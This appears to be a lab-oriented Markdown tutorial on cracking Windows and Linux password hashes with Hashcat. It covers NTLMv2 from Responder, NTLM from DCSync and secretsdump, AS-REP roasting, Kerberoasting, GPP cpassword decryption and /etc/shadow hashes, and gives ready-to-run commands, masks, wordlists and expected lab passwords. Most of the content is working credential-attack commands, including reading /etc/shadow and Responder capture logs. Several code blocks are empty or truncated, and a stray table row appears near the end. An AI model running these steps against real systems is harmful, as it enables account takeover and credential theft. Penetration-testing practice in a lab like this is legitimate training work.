## 1. Setup and Requirements

### Install and Verify Hashcat

```bash

# GPU status — shows detected devices

# If running in a VM without GPU passthrough, use CPU mode
```

```bash
# Primary wordlist — use this first for everything
```

## 2. Hashcat Fundamentals

### Core Syntax

```bash
hashcat [attack-mode] [hash-type] [hash-file-or-hash] [wordlist/mask] [options]
```

### Most Important Flags

| Flag | Purpose |
|------|---------|
| `-m` | Hash type (mode number) |
| `-a` | Attack mode (0=wordlist, 3=brute, 6=hybrid) |
| `-o` | Output file for cracked hashes |
| `--show` | Show already-cracked hashes from potfile |
| `--username` | Strip username from `user:hash` format |
| `-r` | Apply a rule file |
| `-w` | Workload profile (1=low, 3=high, 4=nightmare) |
| `--force` | Ignore warnings (needed in VMs) |
| `--status` | Show live status during cracking |
| `--increment` | Increment mask length automatically |

### Check Already-Cracked Hashes

Hashcat stores cracked hashes in `~/.local/share/hashcat/hashcat.potfile`. After any crack run:

```bash
# Show all cracked hashes from the potfile
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes --show

# Show with usernames
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes --show --username
```

## 3. NTLMv2 — Responder Captures

**Hash mode:** `-m 5600`
**Generated by:** Responder, LLMNR/NBT-NS poisoning, NTLM relay

### Hash Format

```
username::domain:challenge:response:blob
```

Real example from Responder:
```
john.doe::LAB:aad3b435b51404ee:a8d5f4e6b2c9d1f3a7e4c8b5d2f6a9c3:0101000000000000...
```

### Where Responder Saves Captures

```bash
# Responder writes hashes here automatically
ls /usr/share/responder/logs/

# NTLMv2 specifically
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Copy to working directory
cp /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt ~/lab/cracks/ntlmv2.hashes
```

### Crack NTLMv2

```bash
# Step 1: rockyou — always try this first, fastest
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes \
  /usr/share/wordlists/rockyou.txt \
  --force \
  -o ~/lab/cracks/ntlmv2_cracked.txt

# Step 2: rockyou + best64 rules (covers common mutations)
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o ~/lab/cracks/ntlmv2_cracked.txt

# Step 3: OneRuleToRuleThemAll (community rule — very effective)
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule \
  --force \
  -o ~/lab/cracks/ntlmv2_cracked.txt

# Step 4: Corporate password pattern — word + year + symbol
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes \
  -a 3 '?u?l?l?l?l?l?d?d?s' \
  --force \
  -o ~/lab/cracks/ntlmv2_cracked.txt

# Step 5: Targeted — company name wordlist + rules
cat > /tmp/lab_words.txt << 'WORDS'
lab
lablocal
vagrant
password
Password
admin
Admin
WORDS

hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes \
  /tmp/lab_words.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o ~/lab/cracks/ntlmv2_cracked.txt

# Check results
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes --show --username
```

### Expected Lab Results

| Account | Password | Notes |
|---------|----------|-------|
| john.doe | Password123! | Spray target |
| vagrant | Vagrant123! | Default lab account |
| alice.brown | GPOP@ss789! | If captured via coercion |

## 4. NTLM — Pass-the-Hash Prep

**Hash mode:** `-m 1000`
**Generated by:** secretsdump, hashdump, DCSync, SAM dump

### Hash Format

```
NTHASH (32 hex characters)
```

Or with username from secretsdump:
```
administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Extract NT Hashes from secretsdump Output

```bash
# secretsdump output format:
# domain\username:RID:LMhash:NThash:::

# Extract just the NT hash field
cut -d: -f4 ~/lab/loot/dcsync.hashes > ~/lab/cracks/nt_hashes.txt

# Or extract with username for context
awk -F: '{print $1":"$4}' ~/lab/loot/dcsync.hashes > ~/lab/cracks/nt_with_users.txt
```

### Crack NTLM

```bash
# Step 1: rockyou
hashcat -m 1000 ~/lab/cracks/nt_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  --force \
  -o ~/lab/cracks/nt_cracked.txt

# Step 2: With rules
hashcat -m 1000 ~/lab/cracks/nt_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule \
  --force \
  -o ~/lab/cracks/nt_cracked.txt

# Step 3: Brute force short passwords (up to 8 chars, mixed)
hashcat -m 1000 ~/lab/cracks/nt_hashes.txt \
  -a 3 -i '?a?a?a?a?a?a?a?a' \
  --force \
  -o ~/lab/cracks/nt_cracked.txt

# Show cracked
hashcat -m 1000 ~/lab/cracks/nt_hashes.txt --show
```

### Skip Empty Password Hash

The LM hash `aad3b435b51404eeaad3b435b51404ee` and NT hash `31d6cfe0d16ae931b73c59d7e0c089c0` represent empty passwords. Filter them out:

```bash
grep -v "31d6cfe0d16ae931b73c59d7e0c089c0" ~/lab/cracks/nt_hashes.txt \
  > ~/lab/cracks/nt_hashes_filtered.txt
```

## 5. Kerberos 5 AS-REP — AS-REP Roasting

**Hash mode:** `-m 18200`
**Generated by:** `impacket-GetNPUsers`, Rubeus
**Target account in lab:** `svc_asrep`

### Hash Format

```
$krb5asrep$23$username@DOMAIN:checksum$blob
```

Real example:
```
$krb5asrep$23$svc_asrep@LAB.LOCAL:a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8$e9f0a1b2c3d4e5f6...
```

### Crack AS-REP Hash

```bash
# The hash file from GetNPUsers is already in hashcat format
# Step 1: rockyou — usually cracks lab hashes immediately
hashcat -m 18200 ~/lab/creds/asreproast.hashes \
  /usr/share/wordlists/rockyou.txt \
  --force \
  -o ~/lab/cracks/asrep_cracked.txt

# Step 2: rockyou + rules
hashcat -m 18200 ~/lab/creds/asreproast.hashes \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o ~/lab/cracks/asrep_cracked.txt

# Step 3: Service account pattern — ServiceName + numbers + symbol
hashcat -m 18200 ~/lab/creds/asreproast.hashes \
  -a 3 'Service?d?d?d?s' \
  --force \
  -o ~/lab/cracks/asrep_cracked.txt

# Step 4: Hybrid — wordlist + append digits and symbols
hashcat -m 18200 ~/lab/creds/asreproast.hashes \
  -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?s' \
  --force \
  -o ~/lab/cracks/asrep_cracked.txt

# Check results
hashcat -m 18200 ~/lab/creds/asreproast.hashes --show
```

### Expected Lab Result

```
svc_asrep:ServiceP@ss1
```

## 6. Kerberos 5 TGS — Kerberoasting

**Hash mode:** `-m 13100`
**Generated by:** `impacket-GetUserSPNs`, Rubeus
**Target accounts in lab:** `svc_kerberoast`, `svc_sql`, `svc_exchange`

### Hash Format

```
$krb5tgs$23$*username$DOMAIN$spn*$checksum$blob
```

Real example:
```
$krb5tgs$23$*svc_kerberoast$LAB.LOCAL$MSSQLSvc/DB01.lab.local:1433*$a1b2c3d4...
```

### Crack Kerberoast Hash

```bash
# Step 1: rockyou — try first, service accounts often use weak passwords
hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
  /usr/share/wordlists/rockyou.txt \
  --force \
  -o ~/lab/cracks/kerberoast_cracked.txt

# Step 2: rockyou + best64 rules
hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o ~/lab/cracks/kerberoast_cracked.txt

# Step 3: Service account patterns
cat > /tmp/svc_patterns.txt << 'WORDS'
Service
service
ServicePass
SvcPass
SqlSvc
ExchangeSvc
Password
Admin
WORDS

hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
  /tmp/svc_patterns.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --force \
  -o ~/lab/cracks/kerberoast_cracked.txt

# Step 4: Brute force — 8–12 char passwords with mixed case, digits, symbols
# (slow on CPU — skip if using GPU)
hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
  -a 3 -i --increment-min 8 '?u?l?l?l?l?l?d?d?s' \
  --force \
  -o ~/lab/cracks/kerberoast_cracked.txt

# Step 5: Corporate password pattern (Season + Year + Symbol)
hashcat -m 13100 ~/lab/creds/kerberoast.hashes \
  -a 6 /usr/share/seclists/Passwords/seasons.txt '?d?d?d?d!' \
  --force \
  -o ~/lab/cracks/kerberoast_cracked.txt

# Show results
hashcat -m 13100 ~/lab/creds/kerberoast.hashes --show
```

### Expected Lab Results

| Account | SPN | Password |
|---------|-----|----------|
| svc_kerberoast | MSSQLSvc/DB01.lab.local:1433 | ServiceP@ss2 |
| svc_sql | HTTP/EXCH01.lab.local | SqlSvcPass123! |

### AES Kerberoast Hashes (Mode 19700)

If the DC enforces AES encryption, you get a different hash format:

```bash
# AES-128 Kerberoast
hashcat -m 19600 ~/lab/creds/kerberoast_aes.hashes \
  /usr/share/wordlists/rockyou.txt \
  --force

# AES-256 Kerberoast
hashcat -m 19700 ~/lab/creds/kerberoast_aes256.hashes \
  /usr/share/wordlists/rockyou.txt \
  --force
```

## 7. GPP Passwords — AES-256 CBC

**Handled by:** `gpp-decrypt` (not Hashcat — GPP uses reversible encryption)

GPP cpassword values are AES-256 CBC encrypted with a Microsoft-published static key. They are not hashed — they are decryptable directly.

```bash
# Decrypt a cpassword value directly
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
# Expected: GPPmidnight123

# Automated extraction + decryption from SYSVOL
impacket-Get-GPPPassword \
  -username vagrant \
  -password Vagrant123! \
  \\\\172.28.128.21\\SYSVOL
```

If you need to crack the resulting plaintext password further (if it is itself a hash somewhere else), treat it as a known plaintext and search for reuse across other accounts.

## 8. Linux Hashes

### SHA-512 crypt — /etc/shadow (Mode 1800)

Generated when you dump `/etc/shadow` from a compromised Linux host.

```bash
# Hash format: $6$salt$hash
# Example:
# root:$6$rounds=5000$salt$hash:18000:0:99999:7:::

# Extract the hash field
grep root /etc/shadow | cut -d: -f2 > ~/lab/cracks/linux_root.hash

# Crack
hashcat -m 1800 ~/lab/cracks/linux_root.hash \
  /usr/share/wordlists/rockyou.txt \
  --force \
  -o ~/lab/cracks/linux_cracked.txt
```

### MD5 crypt — older Linux (Mode 500)

```bash
# Hash format: $1$salt$hash
hashcat -m 500 ~/lab/cracks/linux_md5.hash \
  /usr/share/wordlists/rockyou.txt \
  --force
```

### Metasploitable2 — msfadmin:msfadmin

The root and msfadmin accounts on Metasploitable2 use MD5 crypt.

```bash
# From /etc/shadow on metasploitable2
# msfadmin:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::

echo '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.' > /tmp/meta2.hash
hashcat -m 500 /tmp/meta2.hash \
  /usr/share/wordlists/rockyou.txt \
  --force
# Expected: msfadmin
```

## 9. Wordlists and Rules

### Wordlist Strategy — Use in This Order

```bash
# 1. rockyou.txt — 14M passwords, fast, covers most lab hashes
/usr/share/wordlists/rockyou.txt

# 2. SecLists common passwords
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# 3. Corporate-focused
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

# 4. Keyboard walks
/usr/share/seclists/Passwords/Common-Credentials/worst-passwords-2017-top200-slashdata.txt
```

### Rule Strategy

```bash
# 1. best64.rule — 64 transformations, very fast, catches most mutations
-r /usr/share/hashcat/rules/best64.rule

# 2. d3ad0ne.rule — comprehensive, good second pass
-r /usr/share/hashcat/rules/d3ad0ne.rule

# 3. T0XlC.rule — good for corporate patterns (append year, capitalize)
-r /usr/share/hashcat/rules/T0XlC.rule

# 4. dive.rule — largest, slowest, use last
-r /usr/share/hashcat/rules/dive.rule
```

### Build a Lab-Specific Wordlist

```bash
# Combine usernames, domain name, company name, common terms
cat > /tmp/lab_base.txt << 'WORDS'
lab
lablocal
labadmin
vagrant
password
Password
admin
Admin
summer
winter
spring
autumn
sysadmin
security
WORDS

# Use hashcat to generate mutations from your base list
hashcat -m 100 --stdout \
  /tmp/lab_base.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  > /tmp/lab_mutations.txt

# Check size
wc -l /tmp/lab_mutations.txt
```

### Multiple Rules at Once

```bash
# Apply two rule files simultaneously (slower but more coverage)

  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/T0XlC.rule \
  --force
```

## 10. Attack Modes Reference

### Mode 0 — Wordlist (Default)

```bash
hashcat -m 5600 hash.txt wordlist.txt
```

### Mode 1 — Combination

Combines every word from list1 with every word from list2.

```bash
# Generates: password123, password!, password2024, etc.
hashcat -m 5600 hash.txt -a 1 /tmp/words1.txt /tmp/words2.txt
```

### Mode 3 — Brute Force / Mask

Generates all combinations matching a mask pattern.

```bash
# Mask characters:
# ?l = lowercase letter
# ?u = uppercase letter
# ?d = digit
# ?s = special character
# ?a = all printable characters
# ?b = all bytes

# 8-char password: Capital + 5 lowercase + 2 digits
hashcat -m 5600 hash.txt -a 3 '?u?l?l?l?l?l?d?d'

# Variable length (increment)
hashcat -m 5600 hash.txt -a 3 -i --increment-min 6 --increment-max 10 '?a?a?a?a?a?a?a?a?a?a'

# Custom character set
hashcat -m 5600 hash.txt -a 3 -1 '!@#$%' 'Password?1'
```

### Mode 6 — Hybrid Wordlist + Mask

Appends a mask to each word in the wordlist.

```bash
# Wordlist word + 4 digits + symbol
hashcat -m 5600 hash.txt -a 6 wordlist.txt '?d?d?d?d?s'

# Very effective against corporate passwords (Password2024!)
hashcat -m 5600 hash.txt -a 6 /tmp/lab_base.txt '?d?d?d?d!'
```

### Mode 7 — Hybrid Mask + Wordlist

Prepends a mask to each word.

```bash
# 2 digits + wordlist word
hashcat -m 5600 hash.txt -a 7 '?d?d' wordlist.txt
```

## 11. Performance Tuning

### Workload Profiles

```bash
# -w 1: Low — background, minimal resource use
# -w 2: Default — balanced
# -w 3: High — full speed, system may be unresponsive
# -w 4: Nightmare — maximum, use with dedicated GPU only

hashcat -m 5600 hash.txt wordlist.txt -w 3 --force
```

### VM-Specific Optimizations

Running in a VM without GPU passthrough limits you to CPU. These settings help:

```bash
# Use all CPU cores
hashcat -m 5600 hash.txt wordlist.txt \
  -D 1 \          # Device type 1 = CPU
  --force \
  --status \
  --status-timer 10

# Check available devices
hashcat -I

# Limit OpenCL threads to avoid VM instability
hashcat -m 5600 hash.txt wordlist.txt \
  --force \
  --opencl-device-types 1 \
  --cpu-affinity 0,1,2,3
```

### Benchmark Your System

```bash
# Benchmark NTLMv2 specifically
hashcat -m 5600 -b --force

# Benchmark all relevant modes
for mode in 1000 5600 13100 18200; do
  echo "=== Mode $mode ==="
  hashcat -m $mode -b --force 2>/dev/null | grep -E "Speed|Hash"
done
```

### Split Large Hash Files

When cracking hundreds of hashes, split by known/unknown to save time:

```bash
# Run with potfile — already-cracked hashes are skipped automatically
# No action needed — Hashcat handles this

# Remove already-cracked from the file to speed up subsequent runs
hashcat -m 5600 ~/lab/cracks/ntlmv2.hashes --show \
  | cut -d: -f1 \
  > /tmp/cracked_usernames.txt

grep -vf /tmp/cracked_usernames.txt ~/lab/cracks/ntlmv2.hashes \
  > ~/lab/cracks/ntlmv2_remaining.hashes
```

| Linux MD5 | 500 | /etc/shadow dump | Metasploitable2 |

```

  1. rockyou
  2. rockyou + d3ad0ne
  3. brute: -i ?a?a?a?a?a?a?a?a

AS-REP (18200):
  1. rockyou
  2. rockyou + best64
  3. svc_patterns.txt + best64
  4. mask: Service?d?d?d?s

TGS Kerberoast (13100):
  1. rockyou
  2. rockyou + best64
  3. svc_patterns.txt + best64
  4. hybrid: wordlist + ?d?d?d?d!
  5. mask: ?u?l?l?l?l?l?d?d?s
```
